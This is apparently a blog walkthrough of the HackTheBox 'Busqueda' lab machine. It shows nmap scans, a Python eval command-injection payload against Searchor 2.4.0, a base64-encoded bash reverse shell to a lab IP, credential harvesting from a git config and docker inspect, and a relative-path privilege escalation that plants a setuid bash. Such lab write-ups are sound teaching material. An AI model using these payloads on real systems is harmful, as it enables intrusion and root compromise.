---
author: "0xt0pus"
title: "HackTheBox Busqueda machine Walkthrough"
date: "2025-01-20"
description: ""
tags: ["Hackthebox", "Machine-Walkthrough"]
cover:
    image: "/writeups/busqueda-HackTheBox/cover.jpg"
ShowToc: true
TocOpen: false
---


## Enumeration

Run nmap all port scanning with the following command:

```
nmap -p- 10.10.11.208 --min-rate 2500 -T4 -oN nmap/allPorts.txt
```

The following is the nmap all ports output:

![](/writeups/busqueda-HackTheBox/2.png)


As the port 22 and 80 are open. Now run the service enumeration to find out the version of services running on the target. 
The following command was used for the service version enumeration. 
```
nmap -A 10.10.11.208 -p 22,80 -oN nmap/ServiceVersion.txt
```

The result of the command shows below:
![](/writeups/busqueda-HackTheBox/3.png)

This shows the `searcher.htb` as the hostname. So updated it in the `/etc/hosts` file. 

Visited the website, which is being shown below:

![](/writeups/busqueda-HackTheBox/5.png)


At the end, the version of the Searchor is shown, which is `Searchor 2.4.0`. Quickly searched if there's any vulnerabilities related to this version. 
I came to know about the Command Injection vulnerability in this version and found an exploit code for that. 

The exploit code can be used to get a reverse shell in easy way. But there's another manual way, through which the command injection vulnerability can be exploited. I have explained both ways below. 

## Exploitation

### Reverse Shell Through the Exploit Code:

The `exploit.sh` is being downloaded from the following Github repository. 
Link: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

Command:
```
./exploit.sh http://searcher.htb 10.10.16.17  # For Exploiting the Vulnerability
nc -lvnp 9001 # Listener for the reverse shell
```


The reverse shell is obtained as shown:
![](/writeups/busqueda-HackTheBox/6.png)


### Reverse Shell in the Manual Way

Opened Burp Suite for gaining access in manual way. 

The site is sending POST request to `/search` with the parameters `engine` and `query` as shown below:
![](/writeups/busqueda-HackTheBox/7.png)

Added a payload with the value of the query parameter to check if its behaviour changes with special characters. 

Added special character list by SecList as the list:
![](/writeups/busqueda-HackTheBox/8.png)

After checking I found that it was not giving any result for the characters `' and \`. So, The logic here was, it was executing some python command like eval. 
The logic can be applied that it was doing something like this:
```
eval("print('a')")
```

So, according to the logic the following command will print `aHello`. 
```
a')+print("Hello")#
```

So, tried this
![](/writeups/busqueda-HackTheBox/9.png)

It printed `Hello`. It means it is executing out python command. 
In order to get command execution I tried the following command:

```python
__import__('os').system('<CMD>')

__import__('os').system('id')

# Final Payload

a')+__import__('os').system('id')#

```

Run the above after URL encoding and we got a code execution as shown below:
![](/writeups/busqueda-HackTheBox/10.png)

Now, we have to get a reverse shell somehow. 

I used the following bash reverse shell:
```bash
bash -i >& /dev/tcp/10.10.16.157/9001 0>&1


# Encoding it as Base64 

echo 'bash -i >& /dev/tcp/10.10.16.157/9001 0>&1' | base64

```

The final Payload:
```bash
┌──(root㉿kali)-[~/Desktop/htb/Busqueda]
└─# echo 'bash -i &> /dev/tcp/10.10.16.17/9001  0>&1  ' | base64
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNi4xNy85MDAxICAwPiYxICAK
```

The following will be send as the request
```
a')+__import__('os').system('echo "YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNi4xNy85MDAxICAwPiYxICAK" | base64 -d | bash')#
```

Got the reverse shell as shown below:
![](/writeups/busqueda-HackTheBox/11.png)

## Privilege Escalation 

After gaining the initial access, I explored the current directory. It contain a .git folder. The config of the git repository contains a password as shown below:
![](/writeups/busqueda-HackTheBox/12.png)

I tried logging in for the current user with SSH, and I was successful because this was the password for the current user svc. 
I checked for `Sudo` privilege escalation and found that the current user can run the `system-checkup.py` as root. 
The following shows the result of `sudo -l`:
![](/writeups/busqueda-HackTheBox/13.png)

I tried, checking the content of this script, but the file was not readable by the current user as shown:

![](/writeups/busqueda-HackTheBox/15.png)

The file can only be executed, so I tried executing the file as root user with the following command:

```
sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py
```

The following three commands can be executed with it as shown:
![](/writeups/busqueda-HackTheBox/16.png)

Seems like the `docker-inspect` can not be executed as it is:
![](/writeups/busqueda-HackTheBox/17.png)

I checked online for its usage and the following command can be used to get details:
```
docker inspect --format='{{json .Config}}' $INSTANCE_ID

# Adjust it according to our usage:

sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e
```

Run the above command and got this data as shown:
![](/writeups/busqueda-HackTheBox/19.png)

This gave us another password, which initially didn't understand. But after further enumeration, I figured out that there was another website running on the `gitea.searcher.htb`. This was found on the apache2 enabled sites as shown:
![](/writeups/busqueda-HackTheBox/20.png)

Added this website in the `/etc/hosts` as well and visited it. This was asking for the username and password. So, used administrator as the username and the above found password as the password. I was able to logged in as an administrator here. 

The script we found earlier were listed here and were readable as shown below:
![](/writeups/busqueda-HackTheBox/21.png)

So, we can analyse these files to find any vulnerability. 

It is found that when the `full-checkup` argument is provided to the script, it runs `./full-checkup.sh` without full path. So, we can create our own file in any writeable directory and can get reverse shell as root, as root will be executing that file. 


The vulnerable part of the code:
![](/writeups/busqueda-HackTheBox/23.png)

Created the following code in the `/dev/shm` with name `full-checkup.sh`:
```bash
#!/bin/bash
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```

The execute permission is being given to the script and run the following command:
```
sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Now, the root shell is copied to the `/tmp` folder as shown below. The bash shell is being used with the following command.

```bash
/tmp/bash -p
```

The following shows the result of the commands:
![](/writeups/busqueda-HackTheBox/24.png)

So, this gives us root access of the machine. 